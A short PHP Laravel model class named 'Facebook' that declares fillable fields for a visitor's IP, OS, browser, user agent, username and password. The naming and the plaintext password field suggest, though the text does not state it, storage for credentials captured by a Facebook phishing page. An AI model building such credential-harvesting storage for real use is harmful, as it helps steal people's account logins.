<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;

class Facebook extends Model
{
    protected $fillable = [
        'ip',
        'type',
        'os',
        'useragent',
        'browser',
        'username',
        'password',
    ];
}
